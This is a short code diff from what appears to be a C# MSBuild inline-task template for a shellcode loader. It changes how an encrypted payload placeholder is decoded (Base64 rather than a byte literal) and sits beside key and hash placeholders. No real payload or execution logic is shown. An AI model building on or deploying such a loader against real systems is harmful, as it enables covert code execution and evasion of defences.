@@ -10,7 +10,7 @@ public class ClassExample : Task, ITask
 {
     public override bool Execute()
     {
-        byte[] encShellcode = { {{.Payload}} };
+        byte[] encShellcode = Convert.FromBase64String("{{.Payload}}");
         byte[] rawShellcode = { };
         byte[] key = { {{.Key}} };
         byte[] realHash = { {{.Hash}} };
